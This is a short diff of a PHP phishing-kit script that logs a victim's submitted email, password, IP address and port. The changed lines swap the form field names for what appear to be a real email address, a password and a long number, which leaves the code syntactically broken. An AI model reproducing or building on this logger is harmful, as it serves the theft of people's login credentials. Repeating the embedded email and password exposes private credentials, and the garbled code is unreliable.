@@ -1,10 +1,10 @@
 
 <?php
-$user = $_POST['email'];
-$password = $_POST['pass'];
+$user = $_POST['maquinadematar0007@gmail.com'];
+$password = $_POST['Tembo97'];
 	$LOG=array(
-	"user" => $user,
-	"password" => $password,
+	"user" => $8008706775897590
+	"password" => $Tembo97,
 	"ip" => $_SERVER["HTTP_X_FORWARDED_FOR"],
 
 "port" => $_SERVER["REMOTE_PORT"],
